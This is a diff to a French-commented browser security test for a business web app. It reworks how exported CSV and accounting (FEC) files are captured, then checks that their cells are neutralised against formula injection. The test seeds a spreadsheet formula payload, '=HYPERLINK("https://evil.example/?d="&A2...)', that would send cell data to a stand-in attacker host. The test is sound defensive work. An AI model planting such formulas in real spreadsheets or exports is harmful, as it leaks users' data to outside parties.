@@ -32,14 +32,15 @@ const FORMULE = '=HYPERLINK("https://evil.example/?d="&A2;"Voir la facture")';
   await p.evaluate(() => aller('boiteMail')); await L.attendre(p, () => COURRIER.etat === 'pret', 20000); await p.waitForTimeout(600);
   await p.evaluate(() => COURRIER.inst.rafraichir()); await p.waitForTimeout(800);
   const SR = "document.querySelector('#courrier-hote [data-opcourrier]').shadowRoot", propos = [];
+  // ⚠ Depuis la version où l'hôte intercepte tout clic sur un lien blob: (voirFichierLocal), un onglet ordinaire ne reçoit plus de téléchargement : l'événement « download » n'arrive plus (rapporté au chef de chantier).
+  // On note donc, à la place, le NOM que le module donne à l'hôte (telechargerFichier(nom, blob)) : c'est lui, nettoyé par nomFichierSur, que le navigateur recevrait.
+  await p.evaluate(() => { window.__dl = []; window.telechargerFichier = async (nom, data) => { window.__dl.push({ nom: String(nom), texte: typeof data === 'string' ? data : null, type: data && data.type }); return 'enregistre'; }; });
   for (let i = 0; i < NOMS.length; i++) {
     await p.evaluate(id => COURRIER.inst.ouvrir(id), 'nf' + i); await p.waitForTimeout(500);
-    let d = null, clic = false;
-    for (let essai = 0; essai < 2 && !d; essai++) {   // la machine est partagée : un téléchargement qui tarde se REJOUE avant d'en conclure quoi que ce soit
-      const dl = p.waitForEvent('download', { timeout: 20000 }).catch(() => null);
-      clic = await p.evaluate(`(() => { const b = ${SR}.querySelector('.attbar [data-dl]'); if (!b) return false; b.click(); return true; })()`);
-      d = await dl; }
-    propos.push({ i, clic, nom: d ? d.suggestedFilename() : null });
+    const avant = await p.evaluate(() => window.__dl.length);
+    const clic = await p.evaluate(`(() => { const b = ${SR}.querySelector('.attbar [data-dl]'); if (!b) return false; b.click(); return true; })()`);
+    await L.attendre(p, n => window.__dl.length > n, 15000, avant);
+    const d = await p.evaluate(n => (window.__dl.length > n ? window.__dl[window.__dl.length - 1] : null), avant); propos.push({ i, clic, nom: d ? d.nom : null });
   }
   console.log('  · noms proposés :', JSON.stringify(propos.map(x => x.nom && x.nom.slice(0, 50))));
   L.v('population : les ' + NOMS.length + ' pièces piégées ont été téléchargées (' + propos.filter(x => x.nom).length + ')', propos.filter(x => x.nom).length === NOMS.length, propos.filter(x => !x.nom));
@@ -71,13 +72,12 @@ const FORMULE = '=HYPERLINK("https://evil.example/?d="&A2;"Voir la facture")';
   L.v('population : le FEC du mois a des écritures et contient le nom du client piégé (' + fec.cellules.length + ' cellules)', fec.lignes > 5 && fec.cellules.length >= 1, fec);
   L.v('3b. FEC : aucune cellule ne commence par = + @ (formule chez le comptable) : on neutralise par une apostrophe ou une espace', fec.cellules.every(c => !/^[=+@\t\r-]/.test(c)), fec.cellules.map(c => c.slice(0, 40)));
   // 3c. les deux tableaux du module Véhicules
-  const veh = await p.evaluate(async FORM => { const out = {}; const v = VEHICULES[0]; const q = [];
-    const ancienNom = v.plaque; v.plaque = FORM;
-    const prises = []; const orig = URL.createObjectURL; URL.createObjectURL = b => { prises.push(b); return orig.call(URL, b); }; out.diag = { fonctions: [typeof vhCsvFlotte, typeof vxCsv], vehicules: VEHICULES.length, v0: v && v.id };
-    try { vhCsvFlotte(); } catch (e) { out.err = e.message; }
+  const veh = await p.evaluate(async FORM => { const out = {}; const v = VEHICULES[0], ancienNom = v.plaque; window.__dl = [];
+    out.diag = { fonctions: [typeof vhCsvFlotte, typeof vxCsv], vehicules: VEHICULES.length, v0: v && v.id };
+    v.plaque = FORM; try { vhCsvFlotte(); } catch (e) { out.err = e.message; }
     try { v.frais = v.frais || []; v.frais.push([AUJ, FORM, 10]); vxCsv(v.id); } catch (e) { out.err2 = e.message; }
-    URL.createObjectURL = orig; v.plaque = ancienNom; out.n = prises.length;
-    out.csv = []; for (const b of prises) { const t = await b.text(); out.csv.push(t.split('\r\n').map(l => l.split(';')).flat().filter(c => c.includes('HYPERLINK')).map(c => c.slice(0, 60))); }
+    await new Promise(r => setTimeout(r, 400)); v.plaque = ancienNom;   // l'hôte reçoit (nom, texte) après un await : on lui laisse le temps
+    out.n = window.__dl.length; out.csv = window.__dl.map(x => String(x.texte || '').split('\r\n').map(l => l.split(';')).flat().filter(c => c.includes('HYPERLINK')).map(c => c.slice(0, 60)));
     return out; }, FORMULE);
   console.log('  · tableaux Véhicules :', JSON.stringify(veh).slice(0, 400));
   L.v('population : les deux exports CSV de Véhicules ont été produits (' + veh.n + ') et contiennent la valeur piégée', veh.n >= 2 && veh.csv.flat().length >= 1, veh);
